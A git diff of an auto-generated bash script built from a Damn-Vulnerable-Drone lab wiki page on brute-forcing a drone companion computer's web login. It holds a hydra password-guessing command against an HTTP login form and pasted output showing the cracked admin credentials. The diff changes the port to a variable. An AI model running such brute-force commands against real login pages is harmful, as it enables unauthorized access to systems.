@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Companion-Computer-Web-UI-Login-Brute-Force.md
-# Created: 2025-11-23 15:43:26
+# Created: 2025-11-23 16:46:38
 # NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 set -euo pipefail
 
@@ -19,8 +19,8 @@ https://github.com/nicholasaleks/Damn-Vulnerable-Drone/tree/master/simulator/mgm
 
 log "[BLOCK 2] type=shell"
 hydra -l admin -P passwords.txt http-post-form \
-"/login:username=^USER^&password=^PASS^:Invalid" -s 3000
+"/login:username=^USER^&password=^PASS^:Invalid" -s ${PORT_WEB}
 
 log "[BLOCK 3] type=shell"
-[3000][http-post-form] host: localhost   login: admin   password: cyberdrone
+[${PORT_WEB}][http-post-form] host: localhost   login: admin   password: cyberdrone
 
